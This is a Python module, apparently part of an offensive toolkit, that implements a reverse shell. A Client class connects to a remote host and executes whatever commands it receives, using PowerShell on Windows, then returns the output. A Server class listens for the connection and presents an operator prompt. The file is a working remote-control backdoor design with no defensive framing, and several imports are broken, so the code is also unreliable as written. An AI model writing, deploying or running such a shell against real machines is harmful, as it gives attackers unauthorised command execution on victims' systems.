import getpass
import subprocess
import platform
from socket import socket
from multi.utils import *


class Client(object):
    def __init__(self, rhost: str, port: int = RandShort()):
        self.TargetAddr = rhost
        self.Port = port
        self.Buffer = 49152

    def connect(self) -> None:
        #socket.setdefaulttimeout(5)
        sock = socket.socket()

        try:
            sock.connect((self.TargetAddr, self.Port))
        except socket.timeout:
            throw(f"Connection with {self.TargetAddr}, timed out.")
        except:
            throw(f"Could not establish connection with {self.TargetAddr}")

        greeting = sock.recv(self.Buffer).decode()
        print(greeting)

        while True:
            command = sock.recv(self.Buffer).decode()

            if command.lower() in ["exit", "quit"]:
                sock.send("Connection will now terminate".encode())
                break

            if os.name == "nt":
                output = subprocess.getoutput(f"powershell.exe {command}")
            else:
                output = subprocess.getoutput(command)
            sock.send(output.encode())

        sock.close()


class Server(object):
    def __init__(self, lhost: str = "0.0.0.0", port: int = RandShort()):
        self.HostAddr = lhost
        self.Port = port
        self.Buffer = 49152

    def get_info(self) -> str:
        info, out = [], ""
        uname = [str(x) for x in platform.uname()]

        for stat in uname:
            if uname.index(stat) != 2:
                info.append(stat)

        for item in info:
            if info.index(item) == 0:
                out = item
            else:
                out = f"{out} {item}"

        return out

    def close_socket(self, client: socket, server: socket):
        socket.socket(client).close()
        socket.socket(server).close()

    def listen(self) -> None:
        server_sock = socket.socket()
        client_sock = socket.socket()
        server_sock.bind((self.HostAddr, self.Port))

        try:
            server_sock.listen(1)  # stay open for one connection
            status(f"Listening for incoming TCP connection on port {self.Port}...")

            client_sock, addr = server_sock.accept()
            status(f"Received connection from {addr[0]} on port {addr[1]}.")
        except KeyboardInterrupt:
            throw(f"User keyboard interrupt has been thrown.")

        #greeting = self.get_info()
        client_sock.send(f"Logged into {self.HostAddr}".encode())
        user, host = getpass.getuser(), socket.gethostname()

        while True:
            try:
                if os.name == "nt":
                    prompt = f"RS {os.getcwd()}> "
                else:
                    prompt = f"{user}@{host}:{os.getcwd()}> "

                command = input(f"{prompt}")
                client_sock.send(command.encode())

                if command.lower() in ["exit", "quit"]:
                    client_sock.send("Connection will now terminate".encode())
                    break

                cmd_results = client_sock.recv(self.Buffer).decode()
                print(cmd_results)
            except (ConnectionAbortedError, ConnectionResetError):
                throw(f"Connection was ended by {self.HostAddr}", terminate=False)
                self.close_socket(client_sock, server_sock)
                throw()
            except ConnectionRefusedError:
                throw(f"Connection was refused by {self.HostAddr}", terminate=False)
                self.close_socket(client_sock, server_sock)
                throw()

        client_sock.close()
        server_sock.close()
